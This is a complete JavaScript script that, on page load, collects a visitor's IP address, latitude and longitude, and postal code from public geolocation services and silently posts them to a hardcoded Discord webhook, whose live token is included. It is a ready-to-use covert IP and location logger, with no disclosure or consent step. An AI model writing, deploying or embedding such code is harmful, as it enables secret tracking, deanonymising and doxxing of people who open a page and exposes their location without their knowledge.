// Function to get the user's IP address
async function getUserIPAddress() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Error getting IP address:', error);
    return 'Unknown';
  }
}

// Function to get the user's coordinates
async function getUserCoordinates() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return {
      latitude: data.latitude,
      longitude: data.longitude
    };
  } catch (error) {
    console.error('Error getting coordinates:', error);
    return { latitude: 'Unknown', longitude: 'Unknown' };
  }
}

// Function to get the user's postal code
async function getUserPostalCode() {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return data.postal;
  } catch (error) {
    console.error('Error getting postal code:', error);
    return 'Unknown';
  }
}

// Function to send the information to the Discord webhook
async function sendToDiscordWebhook(ipAddress, coordinates, postalCode) {
  try {
    const webhookUrl = 'https://discord.com/api/webhooks/1402759827490340925/z-DDNtNjRZV-ODD7afwZQsfRaJKZKJPkA126OHF8NgfTt9nC8reIUp6LUpiplz3HfpN9';
    const payload = {
      content: `User IP Address: ${ipAddress}\nCoordinates: Latitude: ${coordinates.latitude}, Longitude: ${coordinates.longitude}\nPostal Code: ${postalCode}`
    };

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      throw new Error(`HTTP error ${response.status}`);
    }
  } catch (error) {
    console.error('Error sending to Discord webhook:', error);
  }
}

// Main function to retrieve and send the information
async function sendUserInfoToDiscord() {
  try {
    const ipAddress = await getUserIPAddress();
    const coordinates = await getUserCoordinates();
    const postalCode = await getUserPostalCode();

    await sendToDiscordWebhook(ipAddress, coordinates, postalCode);
    console.log('User information sent to Discord webhook successfully.');
  } catch (error) {
    console.error('Error sending user information to Discord:', error);
  }
}

// Call the main function
sendUserInfoToDiscord();
